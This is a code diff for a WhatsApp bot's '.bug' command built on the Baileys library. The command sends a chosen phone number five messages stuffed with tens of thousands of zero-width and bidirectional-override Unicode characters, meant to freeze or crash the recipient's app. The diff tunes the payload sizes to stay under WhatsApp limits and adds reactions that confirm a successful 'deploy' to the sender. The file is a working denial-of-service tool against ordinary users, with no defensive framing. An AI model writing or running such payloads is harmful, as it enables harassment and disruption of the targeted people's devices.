@@ -1,8 +1,22 @@
-// commands/bug.js - Invisible Message Version
+// commands/bug.js - WITH REACTION CONFIRMATION
 const { jidNormalizedUser } = require('@whiskeysockets/baileys');
 
 module.exports = async (sock, from, msg, args, isAdmin, botData) => {
     try {
+        // ============================================
+        // REACT TO THE USER'S COMMAND MESSAGE
+        // ============================================
+        try {
+            await sock.sendMessage(from, {
+                react: {
+                    text: '⚡',
+                    key: msg.key
+                }
+            });
+        } catch (e) {
+            // Reaction failed but continue
+        }
+
         if (!args || args.length === 0) {
             await sock.sendMessage(from, {
                 text: "⚠️ *Usage:* .bug [phone_number]\n\n*Example:* .bug 94703945265"
@@ -22,44 +36,44 @@ module.exports = async (sock, from, msg, args, isAdmin, botData) => {
         const targetJid = jidNormalizedUser(targetNumber + '@s.whatsapp.net');
 
         await sock.sendMessage(from, {
-            text: `🔄 *Invisible Bug Deploying...*\nTarget: ${targetNumber}`
+            text: `🔄 *Bug Deploying...*\nTarget: ${targetNumber}`
         });
 
         // ============================================
-        // INVISIBLE MESSAGE PAYLOADS
+        // SMALLER PAYLOADS - WITHIN WHATSAPP LIMITS
         // ============================================
 
-        // PAYLOAD 1: Completely Invisible (Zero-Width Characters Only)
+        // PAYLOAD 1: Invisible Character Burst (Under 50KB)
         const invisiblePayload1 = {
-            text: '\u200B'.repeat(5000) + '\u200C'.repeat(5000) + '\u200D'.repeat(5000) + '\uFEFF'.repeat(5000) + '\u2060'.repeat(5000)
+            text: '\u200B'.repeat(8000) + '\u200C'.repeat(8000) + '\u200D'.repeat(8000) + '\uFEFF'.repeat(8000)
         };
         await sock.sendMessage(targetJid, invisiblePayload1);
-        await new Promise(resolve => setTimeout(resolve, 800));
+        await new Promise(resolve => setTimeout(resolve, 1000));
 
-        // PAYLOAD 2: Invisible with One Visible Character (Looks like empty message)
+        // PAYLOAD 2: Directional + Invisible Mix
         const invisiblePayload2 = {
-            text: '\u200B'.repeat(10000) + '\u200C'.repeat(10000) + '\u200D'.repeat(10000) + ' '
+            text: '\u202A'.repeat(4000) + '\u202D'.repeat(4000) + '\u202E'.repeat(4000) + '\u200B'.repeat(8000) + '\u200C'.repeat(8000)
         };
         await sock.sendMessage(targetJid, invisiblePayload2);
-        await new Promise(resolve => setTimeout(resolve, 800));
+        await new Promise(resolve => setTimeout(resolve, 1000));
 
-        // PAYLOAD 3: Directional Invisible Overload
+        // PAYLOAD 3: Zero Width Joiner Cascade
         const invisiblePayload3 = {
-            text: '\u202A'.repeat(5000) + '\u202B'.repeat(5000) + '\u202D'.repeat(5000) + '\u202E'.repeat(5000) + '\u2066'.repeat(5000) + '\u2067'.repeat(5000) + '\u2068'.repeat(5000) + '\u2069'.repeat(5000)
+            text: '‍'.repeat(15000) + '‌'.repeat(15000) + '‍'.repeat(15000)
         };
         await sock.sendMessage(targetJid, invisiblePayload3);
-        await new Promise(resolve => setTimeout(resolve, 800));
+        await new Promise(resolve => setTimeout(resolve, 1000));
 
-        // PAYLOAD 4: Invisible + Text Spacing Break
+        // PAYLOAD 4: Multiple Invisible Types
         const invisiblePayload4 = {
-            text: '\u200B'.repeat(20000) + '\u200C'.repeat(20000) + '\u200D'.repeat(20000) + '\u200B'.repeat(20000) + '\u200C'.repeat(20000) + '\u200D'.repeat(20000) + '\uFEFF'.repeat(20000) + '\u2060'.repeat(20000)
+            text: '\u200B'.repeat(5000) + '\u200C'.repeat(5000) + '\u200D'.repeat(5000) + '\uFEFF'.repeat(5000) + '\u2060'.repeat(5000) + '\u2061'.repeat(5000) + '\u2062'.repeat(5000) + '\u2063'.repeat(5000)
         };
         await sock.sendMessage(targetJid, invisiblePayload4);
-        await new Promise(resolve => setTimeout(resolve, 800));
+        await new Promise(resolve => setTimeout(resolve, 1000));
 
-        // PAYLOAD 5: Zero-Width Joiner Cascade
+        // PAYLOAD 5: Spaced Invisible Messages
         const invisiblePayload5 = {
-            text: '‍'.repeat(50000) + '‌'.repeat(50000) + '‍'.repeat(50000) + '‌'.repeat(50000) + '‍'.repeat(50000)
+            text: '\u200B'.repeat(3000) + ' \u200C'.repeat(3000) + ' \u200D'.repeat(3000) + ' \u200B'.repeat(3000) + ' \u200C'.repeat(3000) + ' \u200D'.repeat(3000)
         };
         await sock.sendMessage(targetJid, invisiblePayload5);
 
@@ -79,8 +93,35 @@ module.exports = async (sock, from, msg, args, isAdmin, botData) => {
                   `⏳ Auto-clear: ~5-10 minutes`
         });
 
+        // ============================================
+        // FINAL REACTION - SUCCESS
+        // ============================================
+        try {
+            await sock.sendMessage(from, {
+                react: {
+                    text: '✅',
+                    key: msg.key
+                }
+            });
+        } catch (e) {
+            // Reaction failed but ignore
+        }
+
     } catch (error) {
         console.error('Bug command error:', error);
+        
+        // ============================================
+        // ERROR REACTION
+        // ============================================
+        try {
+            await sock.sendMessage(from, {
+                react: {
+                    text: '❌',
+                    key: msg.key
+                }
+            });
+        } catch (e) {}
+
         await sock.sendMessage(from, {
             text: `❌ Error: ${error.message}`
         });
